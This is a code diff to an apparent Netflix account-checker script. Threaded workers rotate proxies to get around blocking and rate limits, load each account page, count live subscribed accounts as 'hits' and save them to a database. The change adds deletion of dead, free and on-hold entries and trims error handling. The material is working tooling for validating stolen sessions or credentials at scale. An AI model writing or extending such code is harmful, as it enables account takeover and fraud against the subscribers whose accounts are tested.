@@ -333,7 +333,7 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
 # ==========================================
 # --- EXACT THREAD WORKER WITH API HOOK ---
 # ==========================================
-def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None):
+def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None):
     max_retries = 3 
     retryable_status_codes = {403, 429, 500, 502, 503, 504}
 
@@ -347,7 +347,6 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
             continue
 
         success = False
-        last_error = None
 
         for attempt in range(max_retries):
             proxy = random.choice(proxies) if proxies else None
@@ -363,12 +362,14 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                 response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
                 
                 if response.status_code in retryable_status_codes:
-                    last_error = f"HTTP {response.status_code} (Rate Limited/Blocked)"
                     continue 
 
                 if "login" in response.url.lower():
                     with print_lock:
                         stats["dead"] += 1
+                    # --- NEW: Delete if Dead ---
+                    if delete_callback: delete_callback(clean_id)
+                        
                 elif '"graphql":' in response.text:
                     result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
                         response.text, clean_id, processed_guids, guid_lock
@@ -380,7 +381,11 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                         elif result_text == "ERROR":
                             stats["errors"] += 1
                         else:
-                            if is_on_hold: stats["holds"] += 1
+                            if is_on_hold: 
+                                stats["holds"] += 1
+                                # --- NEW: Delete if On Hold ---
+                                if delete_callback: delete_callback(clean_id)
+                                
                             if is_subscribed:
                                 stats["hits"] += 1
                                 stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
@@ -390,6 +395,8 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                                     db_callback(db_data)
                             else:
                                 stats["free"] += 1
+                                # --- NEW: Delete if Free ---
+                                if delete_callback: delete_callback(clean_id)
                 else:
                     with print_lock:
                         stats["unknown"] += 1
@@ -397,11 +404,7 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                 success = True
                 break 
 
-            except requests.exceptions.ProxyError:
-                last_error = "ProxyError (Blocked by Target)"
-                continue 
-            except requests.RequestException as e:
-                last_error = f"{type(e).__name__}"
+            except (requests.exceptions.ProxyError, requests.RequestException):
                 continue 
 
         if not success:
